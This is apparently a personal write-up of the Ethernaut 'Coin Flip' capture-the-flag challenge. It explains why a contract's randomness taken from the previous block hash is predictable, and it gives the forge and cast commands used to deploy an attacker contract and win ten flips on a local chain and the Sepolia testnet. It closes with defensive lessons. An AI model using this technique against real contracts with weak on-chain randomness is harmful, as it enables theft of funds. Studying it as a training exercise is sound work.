# Ethernaut Challenge 03 — Coin Flip

This challenge demonstrates why `blockhash(block.number - 1)` is not a secure source of randomness.

The goal is to correctly predict the result of the coin flip **10 times in a row**.

Instance address:

```
0x1a5484deA83d16f70AF980D04B40CC6568676aE7
```

---

## 🎯 Goal

The challenge is solved when the contract reaches:

```
consecutiveWins == 10
```

---

## 🧠 Thought process

The core of the challenge is inside the `flip()` function:

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1 ? true : false;
```

The contract uses the hash of the **previous block** to determine the outcome of the coin flip.

In Solidity, `blockhash(block.number - 1)` returns the hash of the previous block.  
When cast to `uint256`, the result is a number in the range:

```
0 <= blockValue <= 2^256 - 1
```

The contract also defines:

```solidity
uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
```

This value is equal to:

```
2^255
```

So when the contract computes:

```solidity
uint256 coinFlip = blockValue / FACTOR;
```

the result can only be:

- `0` if `blockValue < 2^255`
- `1` if `blockValue >= 2^255`

This means the contract is effectively extracting the **most significant bit** of the previous block hash.

So the important realization is:

- the coin flip is **not random**
- the previous block hash is **publicly known**
- anyone can reproduce the exact same calculation off-chain or in another contract
- therefore anyone can always predict the correct side

The contract also contains this protection:

```solidity
if (lastHash == blockValue) {
    revert();
}
```

This prevents calling `flip()` multiple times in the same block, because inside the same block `blockhash(block.number - 1)` would always return the same value.

So the exploit must call `flip()` **once per block**, 10 times in a row.

---

## 🧪 Step 1 — Build an attacker contract

To solve the challenge, I wrote an attacker contract called `CoinFlipAttacker`.

This contract reproduces the exact same logic used by the target contract to compute the outcome of the coin flip, and then calls `flip()` with the correct guess.

This works because the attacker contract uses the same input:

`blockhash(block.number - 1)`

and applies the same calculation as the target contract. Since the previous block hash is publicly known when the transaction executes, the attacker contract can deterministically compute the correct result and always win the flip.

---

## 🧪 Step 2 — Test the exploit locally on Anvil

Before using the exploit on Sepolia, I tested it locally.

Start Anvil:

```bash
anvil
```

Deploy the `CoinFlip` contract:

```bash
forge create src/challenge-03-coin-flip/CoinFlip.sol:CoinFlip \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
  --broadcast
```

Deployed `CoinFlip` address:

```
0x5FbDB2315678afecb367f032d93F642f64180aa3
```

Deploy the attacker contract:

```bash
forge create src/challenge-03-coin-flip/CoinFlipAttacker.sol:CoinFlipAttacker \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
  --broadcast \
  --constructor-args 0x5FbDB2315678afecb367f032d93F642f64180aa3
```

Deployed `CoinFlipAttacker` address:

```
0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512
```

Now call `attack()` 10 times:

```bash
for i in {1..10}
do
  echo "Attack attempt $i"
  cast send 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512 \
    "attack()" \
    --rpc-url http://127.0.0.1:8545 \
    --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
  sleep 2
done
```

Then check `consecutiveWins` on the target contract:

```bash
cast call 0x5FbDB2315678afecb367f032d93F642f64180aa3 \
    "consecutiveWins()" \
    --rpc-url http://127.0.0.1:8545
```

Result:

```
0x000000000000000000000000000000000000000000000000000000000000000a
```

Convert to decimal:

```bash
cast --to-dec 0x000000000000000000000000000000000000000000000000000000000000000a
```

Result:

```
10
```

This confirmed that the exploit worked locally.

---

## 🚀 Step 3 — Execute the exploit on Sepolia

First, load the Sepolia RPC URL:

```bash
source .env
```

Deploy the attacker contract:

```bash
forge create src/challenge-03-coin-flip/CoinFlipAttacker.sol:CoinFlipAttacker \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut \
  --broadcast \
  --constructor-args 0x1a5484deA83d16f70AF980D04B40CC6568676aE7
```

Deployed `CoinFlipAttacker` address:

```
0x45A597F2014834825671b231c2Aeee48D513ac69
```

Now call `attack()` 10 times, making sure each call is mined in a different block:

```bash
for i in {1..10}
do
  echo "Attack attempt $i"
  cast send 0x45A597F2014834825671b231c2Aeee48D513ac69 \
    "attack()" \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
  sleep 15
done
```

The `sleep 15` is necessary because the target contract reverts if the same previous block hash is reused.

---

## ✅ Step 4 — Verify the result

Check `consecutiveWins` on the Ethernaut instance:

```bash
cast call 0x1a5484deA83d16f70AF980D04B40CC6568676aE7 \
    "consecutiveWins()" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```
0x000000000000000000000000000000000000000000000000000000000000000a
```

This is equal to:

```
10
```

So the challenge was successfully completed.

---

## 🛡️ Security takeaway

This challenge shows why `blockhash(block.number - 1)` should not be used as a randomness source.

Even though block hashes may appear unpredictable, the previous block hash is already public when a transaction executes.  
That means an attacker can reproduce the same calculation and always predict the result.

Key lessons:

- previous block hashes are public and predictable
- onchain randomness based on block data is insecure
- adding restrictions such as `lastHash` checks does not fix the core issue
- secure randomness requires an external source such as a VRF